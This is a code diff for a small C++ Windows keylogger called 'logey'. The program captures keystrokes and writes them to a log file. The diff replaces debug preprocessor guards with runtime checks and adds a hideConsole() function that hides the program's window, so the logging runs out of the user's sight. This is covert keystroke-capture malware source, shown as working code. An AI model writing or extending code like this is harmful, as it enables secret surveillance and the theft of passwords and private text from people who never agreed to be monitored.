@@ -1,10 +1,7 @@
 #include "logey.h" // Include all necessary functions for logey
-#define DEBUG // Define DEBUG for debugging
 
 int main() {
-#ifndef DEBUG
-	FreeConsole(); // Hides the console
-#endif
+	if (!DEBUG) hideConsole();
 
 	std::string filename = "logey.log"; // The name of the log file
 
@@ -74,12 +71,19 @@ void captureKey(int key, std::string filename) {
 		break;
 	}
 
-#ifdef DEBUG // Only in debug mode
-	std::clog << description; // Write text to console while debugging
-#endif
+	if (DEBUG) std::clog << description; // Write text to console while debugging
+
 	file << description; // Write text to log file
 	file.close(); // Close the log file as soon as possible
 }
+
+void hideConsole() {
+	HWND hideConsole;
+	AllocConsole();
+	hideConsole = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(hideConsole, 0);
+}
+
 
 void createFileHeader(std::string filename) {
 	if (!fileExists(filename)) {
